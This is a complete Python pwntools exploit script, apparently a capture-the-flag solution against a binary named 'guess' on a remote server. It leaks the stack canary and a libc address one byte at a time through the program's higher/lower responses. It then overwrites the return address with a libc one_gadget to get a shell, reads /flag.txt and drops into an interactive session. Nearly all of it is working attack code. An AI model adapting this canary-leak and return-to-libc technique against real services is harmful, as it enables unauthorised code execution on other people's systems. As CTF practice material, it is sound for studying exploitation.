from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './guess'
HOST = '193.57.159.27'
PORT = 25021
# HOST = '172.17.0.2'
# PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x1397])

def get_canary():
	out = 0
	waste = 0
	for i in range(7):
		for j in range(0, 0x100, 2):
			r.sendlineafter('? ', str(33+i))
			r.sendlineafter(': ', str(j))
			result = r.recvuntil('\n')
			if "low" in result:
				continue
			elif "high" in result:
				num = j - 1
				break
			else:
				num = j
				waste += 1
				break
		out |= num << ((i+1)*8)
		# print "canary:", hex(out)
	return out, waste

def get_libc():
	out = 0
	waste = 0
	for i in range(5):
		for j in range(0, 0x100, 2):
			r.sendlineafter('? ', str(49+i))
			r.sendlineafter(': ', str(j))
			result = r.recvuntil('\n')
			if "low" in result:
				continue
			elif "high" in result:
				num = j - 1
				break
			else:
				num = j
				waste += 1
				break
		out |= num << ((i+1)*8)
		# print "canary:", hex(out)
	return out, waste
canary, waste = get_canary()
dbg('canary')
dbg('waste')
leak, waste = get_libc()
base = leak - 0x27000
system = base + 0x55410
binsh = base + 0x1905aa
rdi = base + 0x00026b72
one = [0xe6c7e, 0xe6c81, 0xe6c84]

dbg('base')
dbg('waste')

ret = r.recvuntil('? ')
while 1:
	if 'So,' in ret:
		break
	r.sendline('9')
	r.sendlineafter(': ', '0')

	ret = r.recvrepeat(2)

payload = ''
payload += flat(1, 2, 3, canary, 5, base+one[1])
r.send(payload)
sleep(1)
r.sendline("cat /flag.txt")

r.interactive()
r.close()
